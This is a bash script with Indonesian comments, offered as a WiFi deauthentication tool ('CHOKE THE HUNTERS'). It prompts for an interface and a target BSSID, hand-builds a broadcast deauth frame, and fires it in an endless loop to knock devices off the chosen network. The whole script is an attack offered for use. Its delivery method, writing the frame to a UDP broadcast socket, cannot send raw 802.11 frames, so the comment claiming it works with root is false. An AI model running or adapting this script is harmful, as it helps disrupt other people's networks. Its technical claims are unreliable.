#!/usr/bin/env bash
# CHOKE THE HUNTERS - BXP Native Edition
source ./bxp_libcore.sh

bxp_boot_sequence "CHOKE THE HUNTERS" "printf"

read -p "  ${Y}Interface (contoh: wlan0): ${N}" IFACE
read -p "  ${Y}Target BSSID (xx:xx:xx:xx:xx:xx): ${N}" BSSID

echo -e "${C}[*] Menyiapkan paket Deauth murni...${N}"
# Format hex murni: Deauth (0xC0) + Broadcast Dest + BSSID Src + BSSID BSSID + Reason 7
FRAME=$(printf "\xC0\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF%s%s\x00\x00\x07\x00" \
    "$(echo "$BSSID" | sed 's/://g' | xxd -r -p)" \
    "$(echo "$BSSID" | sed 's/://g' | xxd -r -p)")

echo -e "${G}[+] Menembak Deauth Murni (CTRL+C Stop)...${N}"
# Loop kirim via /dev/udp (raw socket ke broadcast interface)
while true; do
    # Catatan: Di Termux non-root ini bakal gagal (restricted), tapi di PC root bakal jalan.
    printf "%b" "$FRAME" > /dev/udp/255.255.255.255/67 2>/dev/null || true
    sleep 0.05
done
